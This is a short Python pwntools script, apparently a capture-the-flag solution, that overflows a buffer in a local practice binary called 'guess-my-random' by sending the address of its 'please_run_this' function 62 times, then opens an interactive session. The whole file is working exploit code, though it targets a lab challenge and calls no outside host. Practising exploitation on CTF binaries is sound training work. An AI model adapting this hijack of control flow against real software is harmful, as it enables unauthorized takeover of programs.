#!/usr/bin/env python

from pwn import *

p = process('./guess-my-random')
#context.terminal = ['tmux','splitw','-h']
#gdb.attach(p)
addr = p.elf.symbols['please_run_this']
buf = p32(addr) * 62

print(p.recv())
p.sendline(buf)
p.interactive()
